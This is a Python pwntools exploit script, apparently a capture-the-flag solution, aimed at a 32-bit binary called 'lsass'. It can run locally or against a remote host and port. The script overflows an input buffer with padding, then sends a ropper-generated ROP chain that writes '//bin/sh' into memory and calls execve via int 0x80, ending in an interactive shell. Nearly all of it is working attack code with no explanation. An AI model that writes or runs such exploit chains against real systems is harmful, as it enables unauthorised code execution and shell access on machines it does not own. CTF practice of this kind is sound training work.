#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./lsass')

if args.REMOTE:
	p = remote('35.238.225.156', 1004)
else:
	p = process(binary.path)

# ropper --file lsass --chain "execve cmd=/bin/sh" --badbytes 0a
IMAGE_BASE_0 = 0x08048000 # da2732480d49a078e666802ee2edcd948700eacaaa48129430ea1ff6d5e8e5c6
rebase_0 = lambda x : p32(x + IMAGE_BASE_0)

rop  = b''
rop += rebase_0(0x0000319b) # 0x0804b19b: pop edi; ret;
rop += b'//bi'
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret;
rop += rebase_0(0x0009a060)
rop += rebase_0(0x0004627d) # 0x0808e27d: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret;
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += rebase_0(0x0000319b) # 0x0804b19b: pop edi; ret;
rop += b'n/sh'
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret;
rop += rebase_0(0x0009a064)
rop += rebase_0(0x0004627d) # 0x0808e27d: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret;
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += rebase_0(0x0000319b) # 0x0804b19b: pop edi; ret;
rop += p32(0x00000000)
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret;
rop += rebase_0(0x0009a068)
rop += rebase_0(0x0004627d) # 0x0808e27d: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret;
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret;
rop += rebase_0(0x0009a060)
rop += rebase_0(0x0001c081) # 0x08064081: pop ecx; add al, 0xf6; ret;
rop += rebase_0(0x0009a068)
rop += rebase_0(0x0004fa95) # 0x08097a95: pop edx; xor eax, eax; pop edi; ret;
rop += rebase_0(0x0009a068)
rop += p32(0xdeadbeef)
rop += rebase_0(0x00001825) # 0x08049825: pop ebp; ret;
rop += p32(0x0000000b)
rop += rebase_0(0x0001aa7e) # 0x08062a7e: xchg eax, ebp; ret;
rop += rebase_0(0x000319a0) # 0x080799a0: int 0x80; ret;

payload  = 0x11 * b'A'
payload += rop

p.sendlineafter('arguments:\n',payload)
p.interactive()
